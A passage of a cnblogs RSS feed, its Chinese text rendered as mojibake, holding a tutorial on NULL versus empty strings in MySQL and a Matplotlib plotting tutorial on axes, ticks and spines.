<guid isPermaLink="true" >http://www.cnblogs.com/jiba/p/13752664.html</guid>
<description>&lt;p&gt;æ—¥å¸¸å¼€å‘ä¸­ï¼Œä¸€èˆ¬éƒ½ä¼šæ¶‰åŠåˆ°æ•°æ®åº“å¢åˆ æ”¹æŸ¥ï¼Œé‚£ä¹ˆä¸å¯é¿å…ä¼šé‡åˆ°Mysqlä¸­çš„NULLå’Œç©ºå­—ç¬¦ã€‚&lt;br/&gt;ç©ºå­—ç¬¦ï¼ˆ''ï¼‰å’Œç©ºå€¼ï¼ˆnullï¼‰è¡¨é¢ä¸Šçœ‹éƒ½æ˜¯ç©ºï¼Œå…¶å®å­˜åœ¨ä¸€äº›å·®å¼‚ï¼š&lt;/p&gt;
&lt;h2 id=&quot;å®šä¹‰ï¼š&quot;&gt;å®šä¹‰ï¼š&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;ç©ºå€¼(NULL)çš„é•¿åº¦æ˜¯NULLï¼Œä¸ç¡®å®šå ç”¨äº†å¤šå°‘å­˜å‚¨ç©ºé—´ï¼Œä½†æ˜¯å ç”¨å­˜å‚¨ç©ºé—´çš„&lt;/li&gt;
&lt;li&gt;ç©ºå­—ç¬¦ä¸²('')çš„é•¿åº¦æ˜¯0ï¼Œæ˜¯ä¸å ç”¨ç©ºé—´çš„&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;é€šä¿—çš„è®²ï¼š&lt;br/&gt;ç©ºå­—ç¬¦ä¸²ï¼ˆ''ï¼‰å°±åƒæ˜¯ä¸€ä¸ªçœŸç©ºè½¬æ€æ¯å­ï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰ã€‚&lt;br/&gt;ç©ºå€¼ï¼ˆNULLï¼‰å°±åƒæ˜¯ä¸€ä¸ªè£…æ»¡ç©ºæ°”çš„æ¯å­ï¼Œå«æœ‰ä¸œè¥¿ã€‚&lt;br/&gt;äºŒè€…è™½ç„¶çœ‹èµ·æ¥éƒ½æ˜¯ç©ºçš„ã€é€æ˜çš„ï¼Œä½†æ˜¯æœ‰ç€æœ¬è´¨çš„åŒºåˆ«ã€‚&lt;/p&gt;
&lt;h2 id=&quot;åŒºåˆ«ï¼š&quot;&gt;åŒºåˆ«ï¼š&lt;/h2&gt;
&lt;ol&gt;&lt;li&gt;åœ¨è¿›è¡Œcount()ç»Ÿè®¡æŸåˆ—æ—¶å€™ï¼Œå¦‚æœç”¨nullå€¼ç³»ç»Ÿä¼šè‡ªåŠ¨å¿½ç•¥æ‰ï¼Œä½†æ˜¯ç©ºå­—ç¬¦ä¼šè¿›è¡Œç»Ÿè®¡ã€‚&lt;br/&gt;ä¸è¿‡count(*)ä¼šè¢«ä¼˜åŒ–ï¼Œç›´æ¥è¿”å›æ€»è¡Œæ•°ï¼ŒåŒ…æ‹¬nullå€¼ã€‚&lt;/li&gt;
&lt;li&gt;åˆ¤æ–­nullç”¨&lt;code&gt;is null&lt;/code&gt;æˆ–&lt;code&gt;is not null&lt;/code&gt;ï¼ŒSQLå¯ä»¥ä½¿ç”¨&lt;code&gt;ifnull()&lt;/code&gt;å‡½æ•°è¿›è¡Œå¤„ç†ï¼›åˆ¤æ–­ç©ºå­—ç¬¦ç”¨&lt;code&gt;=''&lt;/code&gt;æˆ–è€…&lt;code&gt;!=''&lt;/code&gt;è¿›è¡Œå¤„ç†ã€‚&lt;/li&gt;
&lt;li&gt;å¯¹äºtimestampæ•°æ®ç±»å‹ï¼Œæ’å…¥nullå€¼ä¼šæ˜¯å½“å‰ç³»ç»Ÿæ—¶é—´ï¼›æ’å…¥ç©ºå­—ç¬¦ï¼Œåˆ™å‡ºç°&lt;code&gt;0000-00-00 00:00:00&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;å®ä¾‹ï¼š&quot;&gt;å®ä¾‹ï¼š&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;æ–°å»ºä¸€å¼ è¡¨test_abï¼Œå¹¶æ’å…¥4è¡Œæ•°æ®ã€‚&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;CREATE TABLE test_ab (id int,
        col_a varchar(128),
        col_b varchar(128) not null
);

insert test_ab(id,col_a,col_b) values(1,1,1);
insert test_ab(id,col_a,col_b) values(2,'','');
insert test_ab(id,col_a,col_b) values(3,null,'');
insert test_ab(id,col_a,col_b) values(4,null,1);

mysql&amp;gt; select * from test_ab;
+------+-------+-------+
| id   | col_a | col_b |
+------+-------+-------+
|    1 | 1     | 1     |
|    2 |       |       |
|    3 | NULL  |       |
|    4 | NULL  | 1     |
+------+-------+-------+
4 rows in set (0.00 sec)
&lt;/code&gt;
&lt;/pre&gt;
&lt;ul&gt;&lt;li&gt;é¦–å…ˆæ¯”è¾ƒä¸€ä¸‹ï¼Œç©ºå­—ç¬¦ï¼ˆ''ï¼‰å’Œç©ºå€¼ï¼ˆnullï¼‰æŸ¥è¯¢æ–¹å¼çš„ä¸åŒï¼š&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;mysql&amp;gt; select * from test_ab where col_a = '';
+------+-------+-------+
| id   | col_a | col_b |
+------+-------+-------+
|    2 |       |       |
+------+-------+-------+
1 row in set (0.00 sec)

mysql&amp;gt; select * from test_ab where col_a is null;
+------+-------+-------+
| id   | col_a | col_b |
+------+-------+-------+
|    3 | NULL  |       |
|    4 | NULL  | 1     |
+------+-------+-------+
2 rows in set (0.00 sec)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;ç”±æ­¤å¯è§ï¼Œ&lt;code&gt;null&lt;/code&gt;å’Œ&lt;code&gt;''&lt;/code&gt;çš„æŸ¥è¯¢æ–¹å¼ä¸åŒã€‚è€Œä¸”æ¯”è¾ƒå­—ç¬¦ â€˜=â€™â€™&amp;gt;â€™ â€˜&amp;lt;â€™ â€˜&amp;lt;&amp;gt;â€™ä¸èƒ½ç”¨äºæŸ¥è¯¢nullï¼Œ&lt;br/&gt;å¦‚æœéœ€è¦æŸ¥è¯¢ç©ºå€¼ï¼ˆnullï¼‰ï¼Œéœ€ä½¿ç”¨is null å’Œis not nullã€‚&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;ç¬¬äºŒç§æ¯”è¾ƒï¼Œå‚ä¸è¿ç®—&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;mysql&amp;gt; select col_a+1 from test_ab where id = 4;
+---------+
| col_a+1 |
+---------+
|    NULL |
+---------+
1 row in set (0.00 sec)

mysql&amp;gt; select col_b+1 from test_ab where id = 4;
+---------+
| col_b+1 |
+---------+
|       2 |
+---------+
1 row in set (0.00 sec)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;ç”±æ­¤å¯è§ï¼Œç©ºå€¼ï¼ˆnullï¼‰ä¸èƒ½å‚ä¸ä»»ä½•è®¡ç®—ï¼Œå› ä¸ºç©ºå€¼å‚ä¸ä»»ä½•è®¡ç®—éƒ½ä¸ºç©ºã€‚&lt;br/&gt;æ‰€ä»¥ï¼Œå½“ç¨‹åºä¸šåŠ¡ä¸­å­˜åœ¨è®¡ç®—çš„æ—¶å€™ï¼Œéœ€è¦ç‰¹åˆ«æ³¨æ„ã€‚&lt;br/&gt;å¦‚æœéè¦å‚ä¸è®¡ç®—ï¼Œéœ€ä½¿ç”¨ifnullå‡½æ•°ï¼Œå°†nullè½¬æ¢ä¸º&lt;code&gt;''&lt;/code&gt;æ‰èƒ½æ­£å¸¸è®¡ç®—ã€‚&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;ç¬¬ä¸‰ç§æ¯”è¾ƒï¼Œç»Ÿè®¡æ•°é‡&lt;/li&gt;
&lt;/ul&gt;&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;mysql&amp;gt; select count(col_a) from test_ab;
+--------------+
| count(col_a) |
+--------------+
|            2 |
+--------------+
1 row in set (0.00 sec)

mysql&amp;gt; select count(col_b) from test_ab;
+--------------+
| count(col_b) |
+--------------+
|            4 |
+--------------+
1 row in set (0.00 sec)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;ç”±æ­¤å¯è§ï¼Œå½“ç»Ÿè®¡æ•°é‡çš„æ—¶å€™ã€‚ç©ºå€¼ï¼ˆnullï¼‰å¹¶ä¸ä¼šè¢«å½“æˆæœ‰æ•ˆå€¼å»ç»Ÿè®¡ã€‚&lt;br/&gt;åŒç†ï¼Œsum()æ±‚å’Œçš„æ—¶å€™ï¼Œnullä¹Ÿä¸ä¼šè¢«ç»Ÿè®¡è¿›æ¥ï¼Œè¿™æ ·å°±èƒ½ç†è§£ï¼Œ&lt;br/&gt;ä¸ºä»€ä¹ˆnullè®¡ç®—çš„æ—¶å€™ç»“æœä¸ºç©ºï¼Œè€Œsum()æ±‚å’Œçš„æ—¶å€™ç»“æœæ­£å¸¸äº†ã€‚&lt;/p&gt;
&lt;h2 id=&quot;ç»“è®ºï¼š&quot;&gt;ç»“è®ºï¼š&lt;/h2&gt;
&lt;p&gt;æ‰€ä»¥åœ¨è®¾ç½®é»˜è®¤å€¼çš„æ—¶å€™ï¼Œå°½é‡ä¸è¦ç”¨nullå½“é»˜è®¤å€¼ï¼Œå¦‚æœå­—æ®µæ˜¯intç±»å‹ï¼Œé»˜è®¤ä¸º0ï¼›å¦‚æœæ˜¯varcharç±»å‹ï¼Œé»˜è®¤å€¼ç”¨ç©ºå­—ç¬¦ä¸²ï¼ˆ''ï¼‰ä¼šæ›´å¥½ä¸€äº›ã€‚å¸¦æœ‰nullçš„é»˜è®¤å€¼è¿˜æ˜¯å¯ä»¥èµ°ç´¢å¼•çš„ï¼Œåªæ˜¯ä¼šå½±å“æ•ˆç‡ã€‚å½“ç„¶ï¼Œå¦‚æœç¡®è®¤è¯¥å­—æ®µä¸ä¼šç”¨åˆ°ç´¢å¼•çš„è¯ï¼Œä¹Ÿæ˜¯å¯ä»¥è®¾ç½®ä¸ºnullçš„ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨è®¾ç½®å­—æ®µçš„æ—¶å€™ï¼Œå¯ä»¥ç»™å­—æ®µè®¾ç½®ä¸º not null ï¼Œå› ä¸º not null è¿™ä¸ªæ¦‚å¿µå’Œé»˜è®¤å€¼æ˜¯ä¸å†²çªçš„ã€‚æˆ‘ä»¬åœ¨è®¾ç½®é»˜è®¤å€¼ä¸ºï¼ˆ''ï¼‰çš„æ—¶å€™ï¼Œè™½ç„¶é¿å…äº†nullçš„æƒ…å†µï¼Œä½†æ˜¯å¯èƒ½å­˜åœ¨ç›´æ¥ç»™å­—æ®µèµ‹å€¼ä¸ºnullï¼Œè¿™æ ·æ•°æ®åº“ä¸­è¿˜æ˜¯ä¼šå‡ºç°nullçš„æƒ…å†µï¼Œæ‰€ä»¥å¼ºçƒˆå»ºè®®éƒ½ç»™å­—æ®µåŠ ä¸Š not nullã€‚&lt;/p&gt;
&lt;p&gt;ç±»ä¼¼è¿™æ ·çš„ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;mysql&amp;gt; alter table test_ab modify `col_b` varchar(128) NOT NULL DEFAULT '';
Query OK, 0 rows affected (0.00 sec)
Records: 0  Duplicates: 0  Warnings: 0

mysql&amp;gt; desc test_ab;
+-------+--------------+------+-----+---------+-------+
| Field | Type         | Null | Key | Default | Extra |
+-------+--------------+------+-----+---------+-------+
| id    | int          | YES  |     | NULL    |       |
| col_a | varchar(128) | YES  |     | NULL    |       |
| col_b | varchar(128) | NO   |     |         |       |
+-------+--------------+------+-----+---------+-------+
3 rows in set (0.00 sec)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;å°½ç®¡åœ¨å­˜å‚¨ç©ºé—´ä¸Šï¼Œåœ¨ç´¢å¼•æ€§èƒ½ä¸Šå¯èƒ½å¹¶ä¸æ¯”ç©ºå­—ç¬¦å·®ï¼Œä½†æ˜¯ä¸ºäº†é¿å…å…¶èº«ä¸Šç‰¹æ®Šæ€§ï¼Œç»™é¡¹ç›®å¸¦æ¥ä¸ç¡®å®šå› ç´ ï¼Œå› æ­¤å»ºè®®é»˜è®¤å€¼ä¸è¦ä½¿ç”¨ NULLã€‚&lt;/p&gt;
&lt;p&gt;----by é’¢é“ 648403020@qq.com 09.30.2020&lt;/p&gt;
</description>
<pubDate>Tue, 29 Sep 2020 17:43:00 +0000</pubDate>
<dc:creator>é’¢é“ä¾ çš„çŸ¥è¯†åº“</dc:creator>
<og:description>æ—¥å¸¸å¼€å‘ä¸­ï¼Œä¸€èˆ¬éƒ½ä¼šæ¶‰åŠåˆ°æ•°æ®åº“å¢åˆ æ”¹æŸ¥ï¼Œé‚£ä¹ˆä¸å¯é¿å…ä¼šé‡åˆ°Mysqlä¸­çš„NULLå’Œç©ºå­—ç¬¦ã€‚ ç©ºå­—ç¬¦ï¼ˆ&amp;amp;#39;&amp;amp;#39;ï¼‰å’Œç©ºå€¼ï¼ˆnullï¼‰è¡¨é¢ä¸Šçœ‹éƒ½æ˜¯ç©ºï¼Œå…¶å®å­˜åœ¨ä¸€äº›å·®å¼‚ï¼š å®šä¹‰ï¼š</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/jiba/p/13752664.html</dc:identifier>
</item>
<item>
<title>æ•°æ®åˆ†æä¸æŒ–æ˜ - 08å›¾å½¢ç»˜åˆ¶ - é©¬ä¸€ç‰¹</title>
<link>http://www.cnblogs.com/mayite/p/13752591.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/mayite/p/13752591.html</guid>
<description>&lt;h3 id=&quot;ä¸€-å›¾çš„åŸºæœ¬æ„æˆ&quot;&gt;ä¸€ å›¾çš„åŸºæœ¬æ„æˆ&lt;/h3&gt;
&lt;p&gt;Matplotlibæ˜¯æ•°æ®å¯è§†åŒ–å·¥ä½œä¸­ï¼Œæœ€å¸¸ç”¨çš„ä¸€ä¸ªå¯è§†åŒ–åº“ã€‚Matplotlibæœ‰éå¸¸å¤šçš„å›¾å½¢ï¼Œæˆ‘ä»¬å¾ˆéš¾åœ¨çŸ­æ—¶é—´å†…å°†å…¶æŒæ¡ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆè¦æŒæ¡çš„æ˜¯ç”»å›¾çš„æ€è·¯å’Œå¸¸ç”¨çš„ä¸€äº›å›¾å½¢ã€‚åˆ›å»ºä¸€ä¸ªå›¾çš„æ­¥éª¤å¤§è‡´å¯ä»¥åˆ†ä¸º9æ­¥ï¼Œå½“ç„¶è¿™9æ­¥å¹¶ä¸æ˜¯æ¯ä¸€æ¬¡éƒ½éœ€è¦ï¼Œåªè¦ä½ çŸ¥é“ä¸€ä¸ªå®Œæ•´çš„å›¾å½¢å¯ä»¥æœ‰è¿™ä¹ˆå¤šçš„æ­¥éª¤å°±å¯ä»¥ã€‚æ¯ä¸€ä¸ªæ­¥éª¤å¯¹åº”ç€ä¸€ä¸ªæ“ä½œå’Œæ“ä½œå®ƒçš„å‡½æ•°ã€‚&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;å¯¼å…¥æ¨¡å—ï¼šimport matplotlib.pyplot as plt&lt;/li&gt;
&lt;li&gt;å®šä¹‰å›¾åƒçª—å£ï¼šplt.figure()&lt;/li&gt;
&lt;li&gt;ç”»å›¾ï¼šplt.plot(x, y)&lt;/li&gt;
&lt;li&gt;å®šä¹‰åæ ‡è½´èŒƒå›´ï¼šxè½´:plt.xlim()/yè½´:plt.ylim() limå…¶å®å°±æ˜¯limitçš„ç¼©å†™&lt;/li&gt;
&lt;li&gt;å®šä¹‰åæ ‡è½´åç§°ï¼šxè½´:plt.xlabel()/plt.ylabel()&lt;/li&gt;
&lt;li&gt;å®šä¹‰åæ ‡è½´åˆ»åº¦åŠåç§°ï¼šplt.xticks()/plt.yticks()&lt;/li&gt;
&lt;li&gt;è®¾ç½®å›¾åƒè¾¹æ¡†é¢œè‰²ï¼šax = plt.gca() ax.spines[].set_color()&lt;/li&gt;
&lt;li&gt;è°ƒæ•´åˆ»åº¦ä½ç½®ï¼šax.xaxis.set_ticks_position()/ax.yaxis.set_ticks_position()&lt;/li&gt;
&lt;li&gt;è°ƒæ•´è¾¹æ¡†ï¼ˆåæ ‡è½´ï¼‰ä½ç½®ï¼šax.spines[].set_position()&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;br/&gt;ä¸‹é¢è¯·è·Ÿéšæˆ‘çš„ä»£ç ä¸€èµ·æ¥ç”»ä¸€ä¸ªå›¾æ„Ÿå—ä¸€ä¸‹å§ï¼&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import numpy as np
import matplotlib.pyplot as plt

# np.linspaceå°†ä¼šåœ¨-5åˆ°5çš„åŒºé—´å†…ç”Ÿæˆ100ä¸ªæ•°ï¼Œæ³¨æ„è¿™ä¸ªæ˜¯å‡åŒ€åˆ†å¸ƒçš„
x = np.linspace(-5, 5, 100)

# æ ¹æ®xçš„å€¼ï¼Œç»è¿‡è®¡ç®—ç”Ÿæˆy1å’Œy2çš„å€¼
y1 = 2 * x + 1
y2 = x ** 2

# ç”»å›¾
plt.plot(x, y1)
plt.plot(x, y2, color='red', linewidth=1.0, linestyle='--')

# æ˜¾ç¤º
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;è¿™æ ·æˆ‘ä»¬å°±ç”»å‡ºæ¥ä¸€ä¸ªç®€å•çš„å›¾å½¢äº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ç»§ç»­åœ¨åˆšåˆšç”»çš„è¿™ä¸ªå›¾å½¢ä¸­æ·»åŠ ä¸€äº›å…ƒç´ ã€‚æˆ‘ä»¬è¦åšçš„äº‹æƒ…å°±æ˜¯é‡æ–°å®šä¹‰åæ ‡è½´çš„åç§°ï¼Œåœ¨å®šä¹‰åæ ‡è½´çš„åç§°çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ä¸­æ–‡æ˜¾ç¤º çš„é—®é¢˜ï¼Œè¿™ä¸ªé—®é¢˜æ˜¯ç»•ä¸è¿‡å»çš„é—®é¢˜ã€‚&lt;/p&gt;&lt;p&gt;å¯¹äºWindowsç³»ç»Ÿçš„åŒå­¦åªéœ€åœ¨ä»£ç ä¸­æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;# è§£å†³ä¸­æ–‡æ˜¾ç¤ºé—®é¢˜
font = {&quot;family&quot; : &quot;SimHei&quot;,
 &quot;size&quot; : &quot;20&quot;}
plt.rc(&quot;font&quot;, **font)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;å¯¹äºmacç³»ç»Ÿçš„åŒå­¦æ¥è¯´ï¼Œç¨å¾®æœ‰ç‚¹éº»çƒ¦ï¼Œåœ¨terminalé‡Œé¢è¾“å…¥ï¼šfc-list :lang=zhï¼Œå¦‚æœæ˜¾ç¤ºcommand not foundï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ‰§è¡Œä¸€ä¸ªå®‰è£…å‘½ä»¤ï¼šconda install fontconfigï¼Œç„¶åè¾“å…¥yç¡®è®¤å°±å¯ä»¥è‡ªåŠ¨å®‰è£…å¥½äº†ï¼Œæœ€åå†ä¸€æ¬¡è¾“å…¥fc-list :lang=zhï¼Œå°±å¯ä»¥æŸ¥çœ‹å­—ä½“äº†ï¼Œç„¶åæˆ‘ä»¬åœ¨ä»£ç ä¸­æ·»åŠ ä¸‹é¢ä¸€è¡Œä»£ç ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;ä¸‹é¢è®©æˆ‘ä»¬ä¸€èµ·æ¥æŠŠè¿™ä¸ªç»˜å›¾å®Œå–„èµ·æ¥ï¼Œä»£ç å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import numpy as np
import matplotlib.pyplot as plt

# np.linspaceå°†ä¼šåœ¨-5åˆ°5çš„åŒºé—´å†…ç”Ÿæˆ100ä¸ªæ•°ï¼Œæ³¨æ„è¿™ä¸ªæ˜¯å‡åŒ€åˆ†å¸ƒçš„
x = np.linspace(-5, 5, 100)

# æ ¹æ®xçš„å€¼ï¼Œç»è¿‡è®¡ç®—ç”Ÿæˆy1å’Œy2çš„å€¼
y1 = 2 * x + 1
y2 = x ** 2

# font = {&quot;family&quot; : &quot;SimHei&quot;,
#  &quot;size&quot; : &quot;20&quot;}
# plt.rc(&quot;font&quot;, **font)
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

# è®¾ç½®ç”»å¸ƒå¤§å°
plt.figure(figsize=(8, 5))

# ç”»å›¾
plt.plot(x, y1)
plt.plot(x, y2, color='red', linewidth=1.0, linestyle='--')

# è®¾ç½®åæ ‡è½´èŒƒå›´
plt.xlim((-3, 5))
plt.ylim((-4, 5))

# è®¾ç½®åæ ‡è½´åç§°
plt.xlabel('æˆ‘æ˜¯xè½´')
plt.ylabel('æˆ‘æ˜¯yè½´')

# æ˜¾ç¤º
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;æˆ‘ä»¬çœ‹åˆ°ï¼Œåœ¨åæ ‡è½´ä¸Šè¿˜ä¼šæœ‰ä¸€äº›åˆ»åº¦çš„å­˜åœ¨ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ä¸Šè¾¹çš„ä»£ç åè¾¹åŠ å…¥ä¸€æ®µä»£ç ï¼Œå°±å¯ä»¥è¿›è¡Œåˆ»åº¦çš„ä¿®æ”¹äº†ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;new_ticks = np.linspace(-1, 2, 5)
# è®¾ç½®åæ ‡è½´çš„åˆ»åº¦
plt.xticks(new_ticks)
plt.yticks([-2, -1.8, -1, 1.22, 3], [&quot;åŒ—äº¬&quot;, &quot;å¤©æ´¥&quot;, &quot;æ²³åŒ—&quot;, &quot;ä¸œåŒ—&quot;, &quot;å±±ä¸œ&quot;])
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;é™¤æ­¤ä¹‹å¤–ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åšä¸€äº›å›¾å½¢è¾¹æ¡†ä¸Šçš„ä¿®æ”¹ï¼Œåœ¨æœ¬ç« æœ€å¼€å§‹æˆ‘ä»¬å·²ç»è¯´è¿‡å…³äºå›¾å½¢è¾¹æ¡†ä¿®æ”¹çš„æ–¹æ³•äº†ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠä¸‹é¢çš„ä»£ç æ·»åŠ è‡³æœ«å°¾å³å¯ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;# æ·»åŠ è¾¹æ¡†
ax = plt.gca()
# ä¿®æ”¹å³ä¾§é¢œè‰²
ax.spines[&quot;right&quot;].set_color(&quot;green&quot;)
# ä¿®æ”¹å·¦ä¾§é¢œè‰²
ax.spines[&quot;left&quot;].set_color(&quot;orange&quot;)
# ä¿®æ”¹é¡¶éƒ¨é¢œè‰²
ax.spines[&quot;top&quot;].set_color(&quot;yellow&quot;)
# ä¿®æ”¹åº•éƒ¨é¢œè‰²
ax.spines[&quot;bottom&quot;].set_color(&quot;purple&quot;)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;ä¸€èµ·æ¥çœ‹ä¸€ä¸‹ç°å®çš„æ•ˆæœæ€ä¹ˆæ ·&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1600795840052-451d2044-2e81-4220-bd49-f3db3c026be3.png#align=left&amp;amp;display=inline&amp;amp;height=459&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=918&amp;amp;originWidth=1436&amp;amp;size=93178&amp;amp;status=done&amp;amp;style=none&amp;amp;width=718&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä¸Šä¸‹å·¦å³åªæ“ä½œå…¶ä¸­çš„å·¦ä¾§å’Œåº•éƒ¨ï¼Œé‚£ä¹ˆå…¶ä»–ä¸¤æ¡çº¿å°†ä»ç„¶é»˜è®¤æ˜¯é»‘è‰²,è¿˜æœ‰å¦å¤–ä¸€ä¸ªå°æŠ€å·§ï¼Œæˆ‘ä»¬ä¸Šé¢çš„å›¾å½¢æ€»æ˜¯åœ¨ä¸€ä¸ªæ–¹æ¡†ä¸­æ˜¾ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå³ä¾§å’Œé¡¶éƒ¨çš„çº¿æ¡ä¸è®¾ç½®é¢œè‰²ï¼Œè¿™æ ·çœ‹èµ·æ¥å°±ä¸æˆ‘ä»¬å¹³æ—¶çš„åæ ‡è½´çœ‹èµ·æ¥ä¸€ä¸ªæ ·å­äº†ï¼Œä¹Ÿå°±æ˜¯æŠŠè®¾ç½®è¾¹æ¡†çš„ä»£ç ä¿®æ”¹ä¸ºï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;ax.spines[&quot;right&quot;].set_color(&quot;none&quot;)
ax.spines[&quot;top&quot;].set_color(&quot;none&quot;)
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;ä¿®æ”¹ä¹‹åçœ‹èµ·æ¥å°±å¥½å¤šäº†&lt;br/&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2020/png/281865/1600796029534-8ec0c9c9-5c11-4bd2-8ccf-39347252b6a3.png#align=left&amp;amp;display=inline&amp;amp;height=460&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=image.png&amp;amp;originHeight=920&amp;amp;originWidth=1432&amp;amp;size=86599&amp;amp;status=done&amp;amp;style=none&amp;amp;width=716&quot; alt=&quot;image.png&quot; loading=&quot;lazy&quot;/&gt;&lt;br/&gt;åœ¨æ•°å­¦ä¸­ï¼Œæˆ‘ä»¬çš„å›¾å½¢æœ‰æ—¶æ˜¯åå­—çš„æ ·å¼ï¼Œé‚£ä¸‹é¢æˆ‘ä»¬ä¸€èµ·æ¥çœ‹ä¸€ä¸‹ï¼Œå¦‚ä½•ä¿®æ”¹è¾¹æ¡†çš„ä½ç½®ï¼Œä»£ç å…¶å®ä¹Ÿå¾ˆç®€å•ï¼Œæˆ‘ä»¬é¦–å…ˆæ¥ä¿®æ”¹ä¸€ä¸‹xè½´å¯¹åº”yè½´çš„ä½ç½®ï¼Œå®Œæ•´çš„ä»£ç å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import numpy as np
import matplotlib.pyplot as plt

# np.linspaceå°†ä¼šåœ¨-5åˆ°5çš„åŒºé—´å†…ç”Ÿæˆ100ä¸ªæ•°ï¼Œæ³¨æ„è¿™ä¸ªæ˜¯å‡åŒ€åˆ†å¸ƒçš„
x = np.linspace(-5, 5, 100)

# æ ¹æ®xçš„å€¼ï¼Œç»è¿‡è®¡ç®—ç”Ÿæˆy1å’Œy2çš„å€¼
y1 = 2 * x + 1
y2 = x ** 2

# font = {&quot;family&quot; : &quot;SimHei&quot;,
#  &quot;size&quot; : &quot;20&quot;}
# plt.rc(&quot;font&quot;, **font)
plt.rcParams[&quot;font.family&quot;] = 'Arial Unicode MS'

# è®¾ç½®ç”»å¸ƒå¤§å°
plt.figure(figsize=(8, 5))

# ç”»å›¾
plt.plot(x, y1)
plt.plot(x, y2, color='red', linewidth=1.0, linestyle='--')

# è®¾ç½®åæ ‡è½´èŒƒå›´
plt.xlim((-3, 5))
plt.ylim((-4, 5))

# è®¾ç½®åæ ‡è½´åç§°
plt.xlabel('æˆ‘æ˜¯xè½´')
plt.ylabel('æˆ‘æ˜¯yè½´')

# è®¾ç½®åæ ‡è½´çš„åˆ»åº¦
plt.xticks(np.linspace(-1, 2, 5))
plt.yticks([-2, -1.8, -1, 1.22, 3], [&quot;åŒ—äº¬&quot;, &quot;å¤©æ´¥&quot;, &quot;æ²³åŒ—&quot;, &quot;ä¸œåŒ—&quot;, &quot;å±±ä¸œ&quot;])

# æ·»åŠ è¾¹æ¡†
ax = plt.gca()
# ä¿®æ”¹å³ä¾§é¢œè‰²
ax.spines[&quot;right&quot;].set_color(&quot;none&quot;)
# ä¿®æ”¹å·¦ä¾§é¢œè‰²
ax.spines[&quot;left&quot;].set_color(&quot;orange&quot;)
# ä¿®æ”¹é¡¶éƒ¨é¢œè‰²
ax.spines[&quot;top&quot;].set_color(&quot;none&quot;)
# ä¿®æ”¹åº•éƒ¨é¢œè‰²
ax.spines[&quot;bottom&quot;].set_color(&quot;purple&quot;)

# è®¾ç½®xè½´çš„ä½ç½®
ax.xaxis.set_ticks_position(&quot;bottom&quot;)
ax.spines[&quot;bottom&quot;].set_position((&quot;data&quot;, 0))
# è®¾ç½®yè½´çš„ä½ç½®
ax.yaxis.set_ticks_position(&quot;left&quot;)
ax.spines[&quot;left&quot;].set_position((&quot;data&quot;, 0))

# æ˜¾ç¤º
plt.show()
&lt;/code&gt;
&lt;/pre&gt;
